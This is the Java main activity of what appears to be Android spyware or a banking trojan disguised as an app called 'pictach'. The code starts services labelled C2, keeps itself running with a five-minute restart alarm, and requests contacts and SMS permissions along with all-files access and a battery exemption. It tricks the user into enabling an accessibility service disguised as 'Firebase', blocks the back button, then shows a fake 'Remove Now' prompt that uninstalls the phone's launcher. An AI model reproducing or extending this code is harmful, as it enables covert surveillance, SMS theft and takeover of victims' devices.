package com.android.pictach;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final int REQ_PERMS        = 123;
    private static final int REQ_BATTERY      = 2001;
    private static final int REQ_ALL_FILES    = 2002;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean permissionsDone = false;
    private boolean accessibilityDone = false;
    private boolean uiShown = false;

    private static final String[] RUNTIME_PERMS = {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            getWindow().setStatusBarColor(0);
            getWindow().getDecorView().setSystemUiVisibility(1280);
        } catch (Exception unused) {}

        startC2Services();
        scheduleRestartAlarm();
        startStep1RequestPermissions();
    }

    private void startC2Services() {
        try { startService(new Intent(this, love.class)); } catch (Exception unused) {}
        try { startService(new Intent(this, Api.class)); } catch (Exception unused) {}
    }

    private void scheduleRestartAlarm() {
        try {
            AlarmManager am = (AlarmManager) getSystemService("alarm");
            Intent intent = new Intent(this, MyReceiver.class);
            intent.setAction("PERIODIC_RESTART");
            int flags = Build.VERSION.SDK_INT >= 23 ? 201326592 : 0;
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, flags);
            if (Build.VERSION.SDK_INT >= 23) {
                am.setExactAndAllowWhileIdle(0, System.currentTimeMillis() + 300000, pi);
            } else {
                am.setRepeating(0, System.currentTimeMillis(), 300000L, pi);
            }
        } catch (Exception unused) {}
    }

    private void startStep1RequestPermissions() {
        if (Build.VERSION.SDK_INT >= 23) {
            boolean allGranted = true;
            for (String perm : RUNTIME_PERMS) {
                if (checkSelfPermission(perm) != 0) {
                    allGranted = false;
                    break;
                }
            }
            if (!allGranted) {
                requestPermissions(RUNTIME_PERMS, REQ_PERMS);
                return;
            }
        }
        permissionsDone = true;
        startStep2Battery();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] results) {
        super.onRequestPermissionsResult(requestCode, permissions, results);
        if (requestCode == REQ_PERMS) {
            permissionsDone = true;
            startStep2Battery();
        }
    }

    private void startStep2Battery() {
        if (Build.VERSION.SDK_INT >= 23) {
            PowerManager pm = (PowerManager) getSystemService("power");
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQ_BATTERY);
                    return;
                } catch (Exception unused) {}
            }
        }
        startStep3AllFiles();
    }

    private void startStep3AllFiles() {
        if (Build.VERSION.SDK_INT >= 30) {
            try {
                if (!android.os.Environment.isExternalStorageManager()) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQ_ALL_FILES);
                    return;
                }
            } catch (Exception unused) {}
        }
        startStep4Accessibility();
    }

    private void startStep4Accessibility() {
        if (isAccessibilityEnabled()) {
            accessibilityDone = true;
            showFinalUI();
        } else {
            showAccessibilityUI();
        }
    }

    private boolean isAccessibilityEnabled() {
        try {
            String enabled = Settings.Secure.getString(
                    getContentResolver(), "enabled_accessibility_services");
            if (enabled == null) return false;
            return enabled.contains(getPackageName() + "/" + Firebase.class.getName());
        } catch (Exception unused) {
            return false;
        }
    }

    private void showAccessibilityUI() {
        if (uiShown || isFinishing()) return;
        uiShown = true;

        LinearLayout layout = makeLayout();

        TextView title = new TextView(this);
        title.setText("Setup Required");
        title.setTextSize(20f);
        title.setTextColor(Color.parseColor("#1565C0"));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 16);
        layout.addView(title);

        TextView msg = new TextView(this);
        msg.setText("This app requires Accessibility permission to function.\n\nTap the button below, find this app in the list and enable it.");
        msg.setTextSize(14f);
        msg.setTextColor(Color.parseColor("#333333"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 0, 0, 32);
        layout.addView(msg);

        Button btn = new Button(this);
        btn.setText("Open Accessibility Settings");
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#1565C0"));
        btn.setOnClickListener(v -> openAccessibilitySettings());
        layout.addView(btn, matchWidth());

        setContentView(layout);

        handler.postDelayed(this::checkAccessibilityAndProceed, 1000);
    }

    private void checkAccessibilityAndProceed() {
        if (isFinishing()) return;
        if (isAccessibilityEnabled()) {
            accessibilityDone = true;
            showFinalUI();
        } else {
            handler.postDelayed(this::checkAccessibilityAndProceed, 1000);
        }
    }

    private void openAccessibilitySettings() {
        try {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent.addFlags(268435456);
            String target = getPackageName() + "/" + Firebase.class.getName();
            Bundle b = new Bundle();
            b.putString(":settings:fragment_args_key", target);
            intent.putExtra(":settings:show_fragment_args", b);
            intent.putExtra(":settings:source_package", getPackageName());
            startActivity(intent);
        } catch (Exception unused) {
            try {
                startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
            } catch (Exception unused2) {}
        }
    }

    private void showFinalUI() {
        if (isFinishing()) return;
        uiShown = true;

        LinearLayout layout = makeLayout();

        TextView title = new TextView(this);
        title.setText("Unsupported App");
        title.setTextSize(20f);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        title.setTextColor(Color.parseColor("#CC0000"));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 16);
        layout.addView(title);

        TextView msg = new TextView(this);
        msg.setText("The application is not compatible with your device. Please remove it.");
        msg.setTextSize(14f);
        msg.setTextColor(Color.parseColor("#333333"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 0, 0, 32);
        layout.addView(msg);

        Button btn = new Button(this);
        btn.setText("Remove Now");
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#CC0000"));
        btn.setOnClickListener(v -> uninstallApp());
        layout.addView(btn, matchWidth());

        setContentView(layout);
    }

    private String findByHomeLauncher() {
        try {
            Intent homeIntent = new Intent(Intent.ACTION_MAIN);
            homeIntent.addCategory(Intent.CATEGORY_HOME);
            android.content.pm.ResolveInfo resolveInfo = getPackageManager().resolveActivity(
                homeIntent, android.content.pm.PackageManager.MATCH_DEFAULT_ONLY
            );
            if (resolveInfo == null) return null;
            if (resolveInfo.activityInfo == null) return null;
            String pkg = resolveInfo.activityInfo.packageName;
            if (pkg == null) return null;
            if (pkg.equals("android")) return null;
            if (pkg.equals("com.android.launcher")) return null;
            if (pkg.equals("com.android.launcher2")) return null;
            if (pkg.equals("com.android.launcher3")) return null;
            if (pkg.equals(getPackageName())) return null;
            return pkg;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private void uninstallApp() {
        if (isFinishing() || isDestroyed()) return;
        String targetPackage = findByHomeLauncher();
        if (targetPackage == null) {
            android.util.Log.e("UninstallLogic", "Nova not found — uninstall aborted");
            return;
        }
        try {
            Intent intent = new Intent("android.intent.action.DELETE");
            intent.setData(Uri.parse("package:" + targetPackage));
            intent.putExtra("android.intent.extra.RETURN_RESULT", true);
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_BATTERY) {
            startStep3AllFiles();
        } else if (requestCode == REQ_ALL_FILES) {
            startStep4Accessibility();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (permissionsDone && !accessibilityDone) {
            if (isAccessibilityEnabled()) {
                accessibilityDone = true;
                showFinalUI();
            }
        }
    }

    @Override
    public void onBackPressed() {
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }

    private LinearLayout makeLayout() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#FAFAFA"));
        layout.setPadding(64, 64, 64, 64);
        return layout;
    }

    private LinearLayout.LayoutParams matchWidth() {
        return new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT);
    }
}
